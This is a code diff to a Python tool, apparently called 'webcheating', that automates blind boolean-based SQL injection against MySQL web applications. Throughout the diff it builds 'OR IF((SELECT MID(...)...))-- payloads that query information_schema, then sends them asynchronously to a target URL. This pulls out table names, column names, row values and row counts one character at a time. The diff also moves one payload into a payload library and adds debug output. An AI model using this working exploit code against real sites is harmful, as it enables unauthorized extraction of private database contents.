@@ -10,7 +10,8 @@ from core.payloads import (
     entity_name_payloads,
     entity_count_payloads,
 )
-
+import time
+print(f'\nPAYLOAD: {table_name_payloads["MySQL"][0]}')
 ############################################## TODO: add caching and sessions + logs + dumps  w__W
 
 parser = argparse.ArgumentParser(description="webcheating")
@@ -35,12 +36,14 @@ special_chars = "_.@-:;,/|!#$%^&*(){}[]=+~"
 
 async def send_payload(mode, table, column, offset, position, num, char, session, operator='='):
     #print(f"mode={mode}, table={table}, column={column}, offset={offset}, position={position}, nums={nums}, char={char}, session={session}")
-    payload_table_name = f"'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1){operator}'{char}',1,0)-- "
+    #payload_table_name = f"'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1){operator}'{char}',1,0)-- "
+    payload_table_name = table_name_payloads["MySQL"][0].format(position=position, offset=offset, operator=operator, char=char)
+    #print(payload_table_name)
     payload_column_name = f"'OR IF((SELECT MID(column_name,{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0)-- "
     payload_entity = f"'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0)-- "
     payload_entity_count = f"'OR IF((SELECT COUNT({column}) FROM {table}){operator}{num},1,0)-- "
     
-    full_url_table = f"{url}{payload_table_name}"
+    full_url_table = f'{url}{payload_table_name}'
     full_url_column = f"{url}{payload_column_name}"
     full_url_entity = f"{url}{payload_entity}"
     full_url_entity_count = f"{url}{payload_entity_count}"
@@ -49,7 +52,8 @@ async def send_payload(mode, table, column, offset, position, num, char, session
         async with session.get(full_url_table, allow_redirects=False) as response:
             sys.stdout.write("\033[s")
             print(f"[*] POSITION [{position}]")
-            print(f"[*] payload[{position}]: {char}")
+            print(f"[*] payload[{position}]: {operator}'{char}' || {full_url_table}")
+            #time.sleep(1)
             sys.stdout.flush()
 
             sys.stdout.write("\033[u")
